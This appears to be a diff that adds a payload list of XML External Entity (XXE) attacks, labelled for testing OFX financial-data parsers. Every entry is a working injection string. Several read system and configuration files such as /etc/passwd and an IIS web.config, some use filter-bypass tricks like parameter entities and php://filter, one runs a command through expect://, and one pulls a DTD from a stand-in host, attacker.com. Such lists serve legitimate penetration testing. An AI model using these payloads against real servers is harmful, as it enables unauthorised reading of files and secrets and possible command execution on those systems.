@@ -1,0 +1,31 @@
+# XXE (XML External Entity) Payloads for OFX Testing
+
+# Basic file disclosure (Unix/Linux)
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+# Basic file disclosure (Windows)
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+
+# Windows hosts file
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
+
+# Windows system.ini
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]>
+
+# IIS web.config (common OFX server config)
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]>
+
+# Parameter entity (bypass some filters)
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///etc/passwd'>">%eval;%exfil;]>
+
+# Blind XXE with external DTD (requires attacker server)
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+
+# PHP wrapper for base64 encoding (bypass content filters)
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+
+# Expect wrapper (if enabled)
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+
+# Data URI (sometimes bypasses filters)
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">]>
